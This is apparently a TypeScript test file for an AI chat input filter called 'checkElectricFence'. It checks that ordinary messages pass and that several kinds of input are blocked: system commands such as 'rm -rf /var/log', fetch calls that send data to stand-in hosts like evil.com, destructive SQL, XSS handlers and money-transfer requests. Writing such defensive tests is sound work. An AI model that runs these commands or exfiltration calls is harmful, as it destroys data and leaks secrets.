import { describe, it, expect } from "vitest";
import { checkElectricFence, SAFETY_INSTRUCTION } from "./electric-fence";

describe("checkElectricFence", () => {
  it("allows normal safe messages", () => {
    expect(checkElectricFence("안녕하세요, 오늘 날씨가 좋네요")).toEqual({ blocked: false });
    expect(checkElectricFence("What are your thoughts on AI?")).toEqual({ blocked: false });
    expect(checkElectricFence("Tell me a story about the ocean")).toEqual({ blocked: false });
  });

  it("returns blocked:false for empty or non-string input", () => {
    expect(checkElectricFence("")).toEqual({ blocked: false });
    expect(checkElectricFence(null as unknown as string)).toEqual({ blocked: false });
    expect(checkElectricFence(undefined as unknown as string)).toEqual({ blocked: false });
  });

  it("blocks system commands", () => {
    expect(checkElectricFence("run sudo apt-get install")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("rm -rf /var/log")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("chmod 777 /etc/passwd")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("exec('malicious command')")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("eval(payload)")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("system(cmd)")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
  });

  it("blocks secret/key exfiltration patterns", () => {
    expect(checkElectricFence(".env = production")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("password: mysecretpassword")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("api_key = sk-abc123")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("token: Bearer xyz")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("secret = my_secret_value")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
  });

  it("blocks data exfiltration via HTTP calls", () => {
    expect(checkElectricFence("fetch('https://evil.com/steal')")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    // The regex matches axios( not axios.get( — use direct invocation form
    expect(checkElectricFence("axios('https://attacker.io')")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence('http.get("https://exfil.site/data")')).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
  });

  it("blocks unauthorized money transfer instructions", () => {
    expect(checkElectricFence("send money to account 1234")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("transfer krw 1000000 now")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("process payment immediately")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("wire 500 dollars to this address")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
  });

  it("blocks SQL injection patterns", () => {
    expect(checkElectricFence("drop table users")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("DELETE FROM accounts WHERE 1=1")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("TRUNCATE sessions")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
  });

  it("blocks script injection patterns", () => {
    expect(checkElectricFence("script = alert('xss')")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("javascript = void(0)")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("onerror = exploit()")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
    expect(checkElectricFence("onload = malware()")).toEqual({
      blocked: true,
      reason: "Blocked by safety rules",
    });
  });
});

describe("SAFETY_INSTRUCTION", () => {
  it("is a non-empty string", () => {
    expect(typeof SAFETY_INSTRUCTION).toBe("string");
    expect(SAFETY_INSTRUCTION.trim().length).toBeGreaterThan(0);
  });
});
